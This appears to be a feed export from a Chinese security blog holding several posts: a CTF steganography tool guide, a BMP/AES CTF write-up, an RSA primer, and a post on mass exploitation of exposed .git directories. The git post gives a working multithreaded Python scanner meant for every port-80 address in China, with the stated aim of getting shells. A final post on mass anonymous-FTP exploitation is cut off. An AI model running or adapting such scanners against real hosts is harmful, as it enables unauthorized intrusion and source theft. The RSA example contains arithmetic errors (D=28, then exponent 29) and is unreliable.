    <content type="html"><![CDATA[<h2 id="0x00_Stegdetect"><a href="#0x00_Stegdetect" class="headerlink" title="0x00 Stegdetect"></a>0x00 Stegdetect</h2><p>Stegdetect程序主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息</p>
<h3 id="1_uFF0C_u5B89_u88C5"><a href="#1_uFF0C_u5B89_u88C5" class="headerlink" title="1，安装"></a>1，安装</h3><p>windows安装文件我没找到。我在kali安装Stegdetect比较简单<br>apt-get install stegdetect<br>OutGuess安装：<a href="https://github.com/crorvick/outguess.git" target="_blank" rel="external">https://github.com/crorvick/outguess.git</a><br>./configure &amp;&amp; make &amp;&amp; make install<br>Stegdetect通过统计测试来分析图像文件中是否包含隐藏内容。它运行静态测试以判断隐藏的内容是否存在。此外，它还会尝试识别隐藏内容是通过哪个隐写工具嵌入的。</p>
<h3 id="2_uFF0CStegdetect_u7684_u4E3B_u8981_u9009_u9879_u5982_u4E0B_uFF1A"><a href="#2_uFF0CStegdetect_u7684_u4E3B_u8981_u9009_u9879_u5982_u4E0B_uFF1A" class="headerlink" title="2，Stegdetect的主要选项如下："></a>2，Stegdetect的主要选项如下：</h3><pre><code>q – 仅显示可能包含隐藏内容的图像
n – 启用检查JPEG文件头功能，以降低误报率。如果启用，所有带有批注区域的文件将被视为没有被嵌入信息。
如果JPEG文件的JFIF标识符中的版本号不是1.1，则禁用OutGuess检测。
s – 修改检测算法的敏感度，该值的默认值为1。检测结果的匹配度与检测算法的敏感度成正比，
算法敏感度的值越大，检测出的可疑文件包含敏感信息的可能性越大。
d – 打印带行号的调试信息。
t – 设置要检测哪些隐写工具（默认检测jopi），可设置的选项如下：
j – 检测图像中的信息是否是用jsteg嵌入的。
o – 检测图像中的信息是否是用outguess嵌入的。
p – 检测图像中的信息是否是用jphide嵌入的。
i – 检测图像中的信息是否是用invisible secrets嵌入的。
</code></pre><p>当然误报率还是有的 </p>
<h2 id="0x01_outguess"><a href="#0x01_outguess" class="headerlink" title="0x01 outguess"></a>0x01 outguess</h2><p>linux下载安装比较简单：<br><a href="http://download.csdn.net/detail/florak/5620983" target="_blank" rel="external">http://download.csdn.net/detail/florak/5620983</a><br>./configure &amp;&amp; make &amp;&amp; make install</p>
<p>执行以下命令解密:<br>outguess  -r ‘/root/Desktop/angrybird.jpg’  -t 11.txt</p>
<h2 id="0x02_mp3stego"><a href="#0x02_mp3stego" class="headerlink" title="0x02 mp3stego"></a>0x02 mp3stego</h2><p>mp3stego(<a href="http://www.petitcolas.net/steganography/mp3stego/)主要用于mp3隐写" target="_blank" rel="external">http://www.petitcolas.net/steganography/mp3stego/)主要用于mp3隐写</a><br>使用非常简单<br>加密:encode -E hidden_text.txt -P pass svega.wav svega_stego.mp3<br>解密：decode -X -P pass svega_stego.mp3</p>
<h2 id="0x03_binwalk_2Cdd_2Cforemost_u547D_u4EE4"><a href="#0x03_binwalk_2Cdd_2Cforemost_u547D_u4EE4" class="headerlink" title="0x03 binwalk,dd,foremost命令"></a>0x03 binwalk,dd,foremost命令</h2><p>linux下binwalk命令常用于分析隐写文件，dd命令用于提取文件。<br>分析：<br>    root@kali:~/Desktop# binwalk  baozou_new.jpg </p>
<pre><code>DECIMAL       HEX           DESCRIPTION
-------------------------------------------------------------------------------------------------------------------
0             0x0           JPEG image data, JFIF standard  1.01
4308          0x10D4        Zip encrypted archive data, at least v2.0 to extract, compressed size: 8890,  uncompressed size: 9990, name: &quot;qr.png&quot;  
</code></pre><p>可以看出 0x10D4位置后是zip文件。<br>提取文件：<br>root@kali:~/Desktop# dd if=baozou_new.jpg of=2.zip bs=1 skip=4308<br>9065+0 records in<br>9065+0 records out<br>9065 bytes (9.1 kB) copied, 0.0475933 s, 190 kB/s</p>
<p>foremost命令同样可以达到效果：<br>foremost  -v -i baozou_new.jpg  -o  /root/Desktop/xx<br>支持恢复如下格式：avi, bmp, dll, doc, exe, gif, htm, jar, jpg, mbd, mov, mpg, pdf, png, ppt, rar, rif, sdw, sx, sxc, sxi,<br>sxw, vis, wav, wmv, xls, zip。</p>
<h2 id="0x04_F5-steganography"><a href="#0x04_F5-steganography" class="headerlink" title="0x04 F5-steganography"></a>0x04 F5-steganography</h2><p>git clone <a href="https://github.com/matthewgao/F5-steganography" target="_blank" rel="external">https://github.com/matthewgao/F5-steganography</a><br>cd F5-steganography<br>java Extract ../123456.jpg -p 123456<br>后会生成output.txt文件，里面就有flag了</p>
<h2 id="0x05_steghide"><a href="#0x05_steghide" class="headerlink" title="0x05 steghide"></a>0x05 steghide</h2><p>官网地址：<a href="http://steghide.sourceforge.net/documentation.php" target="_blank" rel="external">http://steghide.sourceforge.net/documentation.php</a><br>在文件中隐藏数据<br>    steghide –embed -cf /root/Desktop/1111.jpg -ef /root/Desktop/embeddate<br>检查图片中隐藏的信息<br>    steghide info  /root/Desktop/1111.jpg<br>steghide extract -sf background.jpg</p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[Stegdetect程序主要用于分析JPEG文件，可以检测到通过JSteg、JPHide、OutGuess、Invisible Secrets、F5、appendX和Camouflage等这些隐写工具隐藏的信息]]>
    
    </summary>
    
      <category term="隐写" scheme="http://www.freev.cc/tags/%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[ctf之图片隐写总结]]></title>
    <link href="http://www.freev.cc/2016/09/02/ctf%E4%B9%8B%E5%9B%BE%E7%89%87%E9%9A%90%E5%86%99%E6%80%BB%E7%BB%93/"/>
    <id>http://www.freev.cc/2016/09/02/ctf之图片隐写总结/</id>
    <published>2016-09-02T07:51:58.000Z</published>
    <updated>2016-09-10T06:15:38.512Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_BMP_u6587_u4EF6_u683C_u5F0F"><a href="#0x00_BMP_u6587_u4EF6_u683C_u5F0F" class="headerlink" title="0x00 BMP文件格式"></a>0x00 BMP文件格式</h2><p>关于BMP文件的详细格式信息请看这个链接<br><a href="http://www.cnblogs.com/tiandsp/archive/2012/10/22/2734552.html" target="_blank" rel="external">http://www.cnblogs.com/tiandsp/archive/2012/10/22/2734552.html</a><br>BMP文件的数据按照从文件头开始的先后顺序分为四个部分：<br>◆ 位图文件头(bmp file header)：  提供文件的格式、大小等信息<br>◆ 位图信息头(bitmap information)：提供图像数据的尺寸、位平面数、压缩方式、颜色索引等信息<br>◆ 调色板(color palette)：可选，如使用索引来表示图像，调色板就是索引与其对应的颜色的映射表<br>◆ 位图数据(bitmap data)：图像数据区</p>
<p><img src="1.png" alt="Alt text"><br>下面是一道实验吧的题，需要自己补全bmp图片文件头，这是一个大神写的具体代码如下：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">header</span><span class="params">()</span>:</span></span><br><span class="line">    btype=<span class="string">'424d'</span> <span class="comment">#头标识</span></span><br><span class="line">    bsize=<span class="string">'360c 3000'</span> <span class="comment">#大小</span></span><br><span class="line">    bapp1=<span class="string">'0000'</span> <span class="comment">#指定应用</span></span><br><span class="line">    bapp2=<span class="string">'0000'</span> <span class="comment">#指定应用</span></span><br><span class="line">    boffset=<span class="string">'3600 0000'</span> <span class="comment">#偏移量这里是54</span></span><br><span class="line">    biSize=<span class="string">'2800 0000'</span> <span class="comment">#位图信息头的大小40</span></span><br><span class="line">    biWidth=<span class="string">'5605 0000'</span> <span class="comment">#宽度，本题1366</span></span><br><span class="line">    biHeight=<span class="string">'0003 0000'</span> <span class="comment">#高度，本题768</span></span><br><span class="line">    biPlanes=<span class="string">'0100'</span> <span class="comment">#颜色平面数，总为1</span></span><br><span class="line">    biBitCount=<span class="string">'1800'</span> <span class="comment">#比特数/像素，本题24位</span></span><br><span class="line">    biCompression=<span class="string">'0000 0000'</span> <span class="comment">#压缩类型，0为不压缩</span></span><br><span class="line">    biSizeImage=<span class="string">'0000 0000'</span> <span class="comment">#图像的大小，本题多少无所谓</span></span><br><span class="line">    biXPelsPerMeter=<span class="string">'0000 0000'</span> <span class="comment">#水平分辨率，缺省</span></span><br><span class="line">    biYPelsPerMeter=<span class="string">'0000 0000'</span> <span class="comment">#垂直分辨率，缺省</span></span><br><span class="line">    biClrUsed=<span class="string">'0000 0000'</span> <span class="comment">#使用的颜色索引数，本题多少无所谓</span></span><br><span class="line">    biClrImportant=<span class="string">'0000 0000'</span> <span class="comment">#重要的颜色索引数，本题多少无所谓</span></span><br><span class="line">    BMPheader=btype+bsize+bapp1+bapp2+boffset+biSize+biWidth+biHeight+biPlanes+biBitCount+biCompression</span><br><span class="line">    BMPheader=BMPheader+biSizeImage+biXPelsPerMeter+biYPelsPerMeter+biClrUsed+biClrImportant</span><br><span class="line">    <span class="keyword">return</span> BMPheader.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">ciphertext=open(<span class="string">'./bestwing12345678.bmp'</span>,<span class="string">'rb'</span>).read()</span><br><span class="line">f=open(<span class="string">'out.bmp'</span>,<span class="string">'wb'</span>)</span><br><span class="line">f.write(header().decode(<span class="string">'hex'</span>)+ciphertext)</span><br><span class="line">f.close()</span><br></pre></td></tr></table></figure>
<p>以上代码会补全会生成图片<br><img src="out1.bmp" alt="x"><br>这道题实际是AES加密大神代码如下：<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># -*- coding:utf-8 -*-</span></span><br><span class="line"><span class="comment"># author:pcat</span></span><br><span class="line"><span class="comment"># http://pcat.cnblogs.com</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getBMPheader</span><span class="params">()</span>:</span></span><br><span class="line">true<span class="comment">#bmp是LITTLE-ENDIAN（小字节序、低字节序）</span></span><br><span class="line">truebfType=<span class="string">'424d'</span> <span class="comment">#文件类型</span></span><br><span class="line">truebfSize=<span class="string">'360c 3000'</span> <span class="comment">#文件大小，本题3148800+54</span></span><br><span class="line">truebfReserved1=<span class="string">'0000'</span> <span class="comment">#保留，为0</span></span><br><span class="line">truebfReserved2=<span class="string">'0000'</span> <span class="comment">#保留，为0</span></span><br><span class="line">truebfOffBits=<span class="string">'3600 0000'</span> <span class="comment">#数据离文件头偏离量</span></span><br><span class="line">truebiSize=<span class="string">'2800 0000'</span> <span class="comment">#位图信息头的大小</span></span><br><span class="line">truebiWidth=<span class="string">'5605 0000'</span> <span class="comment">#宽度，本题1366</span></span><br><span class="line">truebiHeight=<span class="string">'0003 0000'</span> <span class="comment">#高度，本题768</span></span><br><span class="line">truebiPlanes=<span class="string">'0100'</span> <span class="comment">#颜色平面数，为1</span></span><br><span class="line">truebiBitCount=<span class="string">'1800'</span> <span class="comment">#比特数/像素，本题24位</span></span><br><span class="line">truebiCompression=<span class="string">'0000 0000'</span> <span class="comment">#压缩类型，0为不压缩</span></span><br><span class="line">truebiSizeImage=<span class="string">'0000 0000'</span> <span class="comment">#图像的大小，本题多少无所谓</span></span><br><span class="line">truebiXPelsPerMeter=<span class="string">'0000 0000'</span> <span class="comment">#水平分辨率，缺省</span></span><br><span class="line">truebiYPelsPerMeter=<span class="string">'0000 0000'</span> <span class="comment">#垂直分辨率，缺省</span></span><br><span class="line">truebiClrUsed=<span class="string">'0000 0000'</span> <span class="comment">#使用的颜色索引数，本题多少无所谓</span></span><br><span class="line">truebiClrImportant=<span class="string">'0000 0000'</span> <span class="comment">#重要的颜色索引数，本题多少无所谓</span></span><br><span class="line">truebmp_header=bfType+bfSize+bfReserved1+bfReserved2+bfOffBits</span><br><span class="line">truebmp_header+=biSize+biWidth+biHeight+biPlanes+biBitCount+biCompression+biSizeImage</span><br><span class="line">truebmp_header+=biXPelsPerMeter+biYPelsPerMeter+biClrUsed+biClrImportant</span><br><span class="line">truebmp_header=bmp_header.replace(<span class="string">' '</span>,<span class="string">''</span>)</span><br><span class="line">true<span class="keyword">return</span> bmp_header</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">foo</span><span class="params">()</span>:</span></span><br><span class="line">trueciphertext=open(<span class="string">'bestwing12345678.bmp'</span>,<span class="string">'rb'</span>).read() <span class="comment">#记得有'b'</span></span><br><span class="line">truekey=<span class="string">'bestwing12345678'</span></span><br><span class="line">trueobj=AES.new(key,AES.MODE_ECB)</span><br><span class="line">truemessage=obj.decrypt(ciphertext)</span><br><span class="line">truefsave=open(<span class="string">'out.bmp'</span>,<span class="string">'wb'</span>) <span class="comment">#记得有'b'</span></span><br><span class="line">truefsave.write(getBMPheader().decode(<span class="string">'hex'</span>)+message)</span><br><span class="line">truefsave.close()</span><br><span class="line">true<span class="keyword">pass</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">truefoo()</span><br><span class="line">true<span class="keyword">print</span> <span class="string">'ok'</span></span><br></pre></td></tr></table></figure></p>
<p>扫描二维码拿到flag：<br><img src="out.bmp" alt="x"><br>相关链接<br><a href="http://www.cnblogs.com/l2rf/p/5643352.html" target="_blank" rel="external">http://www.cnblogs.com/l2rf/p/5643352.html</a></p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_BMP_u6587_u4EF6_u683C_u5F0F"><a href="#0x00_BMP_u6587_u4EF6_u683C_u5F0F" class="headerlink" title="0x00 BMP文件格式"></a>0x00 BMP文件]]>
    </summary>
    
      <category term="隐写" scheme="http://www.freev.cc/tags/%E9%9A%90%E5%86%99/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[RSA公钥密码算法原理以及安全性]]></title>
    <link href="http://www.freev.cc/2016/08/09/RSA%E5%85%AC%E9%92%A5%E5%AF%86%E7%A0%81%E7%AE%97%E6%B3%95%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E5%AE%89%E5%85%A8%E6%80%A7/"/>
    <id>http://www.freev.cc/2016/08/09/RSA公钥密码算法原理以及安全性/</id>
    <published>2016-08-09T08:12:37.000Z</published>
    <updated>2016-09-02T06:16:55.048Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00_RSA_u539F_u7406_u5206_u6790"><a href="#0x00_RSA_u539F_u7406_u5206_u6790" class="headerlink" title="0x00 RSA原理分析"></a>0x00 RSA原理分析</h2><p>关于rsa算法的历史这里不再介绍，直接看重点。rsa可以用做公钥密码和数字签名，首先你得知道他是一个公钥加密算法，公钥加密<br>的密钥分为加密的密钥和解密的密钥，也就是公钥和私钥，公钥可以公开的密钥，私钥用作解密的密钥。<br>一,关键词：<br>公钥：数E 和N<br>私钥：数D 和N<br>加密 E次方的mod n<br>解密 D次方mod n<br>具体步骤：<br>1，求N<br>2，求L（在rsa加密解密过程中不出现，而是出现在生成密钥对的过程中）<br>3，求E<br>4，求D<br>二，详细步骤：<br>1，生成p和q为两个大质数，<br>2，N为两数乘积<br>3，L的p-1和q-1的最小公倍数<br>4，E是个比1大比L小的数，且e和L 的最大公约数必须为1<br>5，D是由数E计算得到的,满足1&lt;D&lt;L </p>
<h4>

<h2 id="0x01_RSA_u539F_u7406_u5B9E_u8DF5"><a href="#0x01_RSA_u539F_u7406_u5B9E_u8DF5" class="headerlink" title="0x01 RSA原理实践"></a>0x01 RSA原理实践</h2><p>一，分析<br>1，准备两个质数p=17 q=19。 N = p 乘 q=323<br>2，L为p-1和q-1的最小公倍数，L=lcm（p-1，q-1）L=144<br>3，E和L的最大公约数必须为1，gcm（E，L）=1，满足条件的很多： 5，7，11，13，17，19…….。但是 E L必须互为质数  所以为选择5为E<br>4，公钥也就是 E为5 N为323<br>5，求D D必须满足以下条件：E*D mod L=1，28 满足条件，D=28<br>6，所以公钥为（5，323）<br>7，私钥28，323）<br>二，加密过程<br>要加密的明文必须为小于N的数 也就是小于323<br>假设明文为123<br>明文^e mod N= 123^5 mod N=255密文255<br>三，解密过程：<br>D=28，N=323<br>密文^D mod N=255^29 mod 323=123</p>
<p></p><h4><p></p>
<h2 id="0x03_RSA_u5B89_u5168_u6027"><a href="#0x03_RSA_u5B89_u5168_u6027" class="headerlink" title="0x03 RSA安全性"></a>0x03 RSA安全性</h2><p>一，只要知道数D 就能对密文暴力破解 ，当D足够长时就不能在现实的时间内暴力破解找到D。<br>二，通过E和N求D，当知道E和N时是不能破解D的，虽然E，D满足：E*D mod L =1，L为lcmp（p-1，q-1）的值但是 破译者并不知道p 和q。<br>三，当把p和q交给破译者 就相当于把密钥交给了破译者但是N 是公开的 可以通过质因数分解求出p 和q ，所以说一旦发现对大整数进行质因数分解的高效算法rsa是可以破解的<br>通过猜测p 和q 进行破解。</p>
<h4>

<pre><code>Author:FreeV
</code></pre></h4></h4></h4>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00_RSA_u539F_u7406_u5206_u6790"><a href="#0x00_RSA_u539F_u7406_u5206_u6790" class="headerlink" title="0x00 RSA原理分析"></a>0x00 RSA原理]]>
    </summary>
    
      <category term="加密解密" scheme="http://www.freev.cc/tags/%E5%8A%A0%E5%AF%86%E8%A7%A3%E5%AF%86/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[git泄漏批量实现]]></title>
    <link href="http://www.freev.cc/2016/05/09/git%E6%B3%84%E6%BC%8F%E6%89%B9%E9%87%8F%E5%AE%9E%E7%8E%B0/"/>
    <id>http://www.freev.cc/2016/05/09/git泄漏批量实现/</id>
    <published>2016-05-09T04:40:00.000Z</published>
    <updated>2016-09-02T06:16:16.234Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>随意代码托管给程序员带来的方便，git泄露也随之普遍，包括一个大厂商判断也简单，<a href="http://www.baidu.com/.git/index" target="_blank" rel="external">http://www.baidu.com/.git/index</a> 如果存在就可以利用了，<br>可以利用工具，审计源码，拿到shell</p>
<h2 id="0x01__u6F0F_u6D1E_u5229_u7528"><a href="#0x01__u6F0F_u6D1E_u5229_u7528" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>说到批量，不得不提的就是如何获取全国的80端口ip，zmap是一个不错的选择，关于中国ip段，网上还是有很多方法获取到，漏洞效率目前还可以一万个80端口ip能扫到8个左右的git泄露。那中国那么多ip还是可观的。</p>
<h2 id="0x02__u4EE3_u7801_u5B9E_u73B0"><a href="#0x02__u4EE3_u7801_u5B9E_u73B0" class="headerlink" title="0x02 代码实现"></a>0x02 代码实现</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python</span></span><br><span class="line"><span class="comment">#coding:utf-8</span></span><br><span class="line"><span class="keyword">import</span>  threading</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_git</span><span class="params">(host,num)</span>:</span></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        s=requests.get(<span class="string">'http://'</span>+host+<span class="string">'/.git/index'</span>,allow_redirects = <span class="keyword">False</span>,timeout=<span class="number">3</span>,verify=<span class="keyword">False</span>)</span><br><span class="line">        su=s.status_code</span><br><span class="line">        html=s.text</span><br><span class="line">        <span class="keyword">if</span> su==<span class="number">200</span> <span class="keyword">and</span> get_real(html[<span class="number">0</span>:<span class="number">4</span>]):</span><br><span class="line">            <span class="keyword">print</span> (<span class="string">'%d :%s ok'</span>%(num,host))</span><br><span class="line">            gitfile.write(host+<span class="string">'\n'</span>)</span><br><span class="line">        <span class="keyword">else</span>: <span class="keyword">print</span> (<span class="string">'%d :%s no really'</span>%(num,host))</span><br><span class="line">    <span class="keyword">except</span> Exception,ex:</span><br><span class="line">         <span class="keyword">print</span> (<span class="string">'%d :%s %s'</span>%(num,host,ex))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_real</span><span class="params">(html)</span>:</span></span><br><span class="line">   <span class="comment"># print html</span></span><br><span class="line">    <span class="keyword">if</span> html==<span class="string">'DIRC'</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="keyword">True</span></span><br><span class="line">    <span class="keyword">return</span> <span class="keyword">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getlin</span><span class="params">(li)</span>:</span></span><br><span class="line">    con=linecache.getline(hostpath,li).strip(<span class="string">'\n\r\t'</span>)</span><br><span class="line">    <span class="keyword">if</span> con: <span class="keyword">return</span> con</span><br><span class="line">    <span class="keyword">else</span>: <span class="keyword">return</span> <span class="keyword">None</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    x=<span class="number">0</span></span><br><span class="line">    a=len(linecache.getlines(hostpath))</span><br><span class="line">    threads=[]</span><br><span class="line">    th=<span class="number">30</span></span><br><span class="line">    <span class="keyword">while</span> x&lt;a:</span><br><span class="line">        flag=<span class="number">0</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,th+x):</span><br><span class="line">            <span class="keyword">if</span> getlin(i+<span class="number">1</span>):</span><br><span class="line">                flag+=<span class="number">1</span></span><br><span class="line">                temp=threading.Thread(target=is_git,args=(getlin(i+<span class="number">1</span>),i))</span><br><span class="line">                threads.append(temp)</span><br><span class="line">            <span class="keyword">else</span>: <span class="keyword">break</span></span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)):</span><br><span class="line">            threads[i].start()</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> range(x,len(threads)):</span><br><span class="line">            threads[i].join()</span><br><span class="line">        x=x+th</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ ==<span class="string">'__main__'</span>:</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> len(sys.argv)==<span class="number">3</span>:</span><br><span class="line">        hostpath=sys.argv[<span class="number">1</span>]</span><br><span class="line">        gitpath=sys.argv[<span class="number">2</span>]</span><br><span class="line">       </span><br><span class="line">        gitfile=open(gitpath,<span class="string">'a'</span>)</span><br><span class="line">        main()</span><br><span class="line">    <span class="keyword">else</span>:  <span class="keyword">print</span> <span class="string">"python git.py   host.txt    git.txt "</span></span><br></pre></td></tr></table></figure>
<h2 id="0x03__u6F0F_u6D1E_u4FEE_u590D"><a href="#0x03__u6F0F_u6D1E_u4FEE_u590D" class="headerlink" title="0x03 漏洞修复"></a>0x03 漏洞修复</h2><p>检查网站目录下是否存在.git目录。删除目录。<br>脚本下载：<a href="https://git.oschina.net/Free_V/GitTesting.git" target="_blank" rel="external">https://git.oschina.net/Free_V/GitTesting.git</a></p>
<pre><code>Author:FreeV
</code></pre>]]></content>
    <summary type="html">
    <![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>随意]]>
    </summary>
    
      <category term="python" scheme="http://www.freev.cc/tags/python/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[pyhton多线程批量ftp未授权访问漏洞]]></title>
    <link href="http://www.freev.cc/2016/04/11/pyhton%E5%A4%9A%E7%BA%BF%E7%A8%8B%E6%89%B9%E9%87%8Fftp%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E6%BC%8F%E6%B4%9E/"/>
    <id>http://www.freev.cc/2016/04/11/pyhton多线程批量ftp未授权访问漏洞/</id>
    <published>2016-04-11T13:32:32.000Z</published>
    <updated>2016-09-02T06:16:52.224Z</updated>
    <content type="html"><![CDATA[<h2 id="0x00__u6F0F_u6D1E_u5206_u6790"><a href="#0x00__u6F0F_u6D1E_u5206_u6790" class="headerlink" title="0x00 漏洞分析"></a>0x00 漏洞分析</h2><p>ftp未授权访问是一个很老的漏洞了,现在包括vsftp在内的很多主流的ftp软件都默认配置都存在这个漏洞，不过在linux下vsftp默认配置没有上传权限，只有读的权限，也就是说如果管理员装有vsftp并且没有进行配置，那么那就有机会观赏网站的源码了，<br>如果在windows中好多网站还是可以直接上传shell的，所谓的ftp未授权就是ftp匿名登录。关于vsftp配置相关文章：<br><a href="http://www.osyunwei.com/archives/9006.html" target="_blank" rel="external">http://www.osyunwei.com/archives/9006.html</a><br><a href="http://www.cnblogs.com/JemBai/archive/2009/02/05/1384413.html" target="_blank" rel="external">http://www.cnblogs.com/JemBai/archive/2009/02/05/1384413.html</a></p>
<h2 id="0x01__u6F0F_u6D1E_u5229_u7528"><a href="#0x01__u6F0F_u6D1E_u5229_u7528" class="headerlink" title="0x01 漏洞利用"></a>0x01 漏洞利用</h2><p>先用zmap扫描全国ip 21端口，然后利用一下脚本跑就可以了。如果你想要直接上传shell的权限，就在zmap扫描端口中加上3389。扫描结果中还是包含很多电影资源ftp等，你可以在判断一下比如在ftp.nlst()函数的返回结果中判断是否包含 “web.config,www,web,index.html”等关键字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> linecache</span><br><span class="line"><span class="keyword">import</span> threading</span><br><span class="line"><span class="keyword">from</span> ftplib <span class="keyword">import</span> FTP</span><br><span class="line"><span class="keyword">import</span> time</span><br><span class="line"></span><br><span class="line">ftpfile=open(<span 